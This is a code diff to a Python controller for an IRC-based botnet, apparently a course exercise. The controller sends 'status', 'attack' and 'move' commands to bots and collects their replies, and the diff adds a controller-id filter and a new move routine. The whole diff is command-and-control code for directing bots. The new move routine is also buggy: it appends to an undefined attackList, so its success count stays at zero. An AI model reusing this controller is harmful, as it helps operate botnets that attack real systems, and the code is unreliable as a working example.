@@ -12,6 +12,7 @@ def sendPrivMSG(target,message):
 
 def do_status(client, args):
     global channel
+    global id
     print(channel)
     sendPrivMSG(channel,'status')
     botList = []
@@ -26,7 +27,8 @@ def do_status(client, args):
             print('-------------------------------------------------------')
             for line in lines:
                 if line:
-                    botList.append(line.split(':')[2].strip())
+                    if 'PRIVMSG controller' + id in line and line[:4] == ':bot':
+                        botList.append(line.split(':')[2].strip())
         except socket.timeout:
             break
     print('found '+ str(len(botList))+' bots: ', end='')
@@ -51,7 +53,8 @@ def do_attack(client, args):
             print('-------------------------------------------------------')
             for line in lines:
                 if line:
-                    attackList.append(line.split(':',2)[2].strip())
+                    if 'PRIVMSG controller' + id in line and line[:4] == ':bot':
+                        attackList.append(line.split(':',2)[2].strip())
         except socket.timeout:
             break
     success = 0
@@ -66,7 +69,25 @@ def do_attack(client, args):
 
 
 def do_move(client, args):
-    print("bots connect to the new IRC server")
+    print("move", args[1], args[2], args[3])
+    sendPrivMSG(channel, 'move '+args[1]+' '+args[2]+' '+args[3])
+    moveList = []
+    client.settimeout(5)
+    while True:
+        try:
+            data = client.recv(1024).decode('utf-8')
+            print("A message from server:", data)
+            print('-------------------------------------------------------')
+            lines = data.split('\n')
+            print(lines)
+            print('-------------------------------------------------------')
+            for line in lines:
+                if line:
+                    if 'PRIVMSG controller' + id in line and line[:4] == ':bot':
+                        attackList.append(line.split(':',2)[2].strip())
+        except socket.timeout:
+            break
+    print('Total: '+ str(len(moveList)) + ' successfully moved')
 
 def do_quit(client, args):
     client.close()
@@ -86,7 +107,7 @@ interpretInput = {
 
 secret = None
 channel = None
-
+id = ''
 if __name__ == "__main__":
     HOST = sys.argv[1]
     srcPort = int(sys.argv[2])
@@ -123,7 +144,6 @@ if __name__ == "__main__":
     sendPrivMSG(channel,secret)
 
     print('going to while')
-
 
     while True:
         data = input("Please enter your command:")
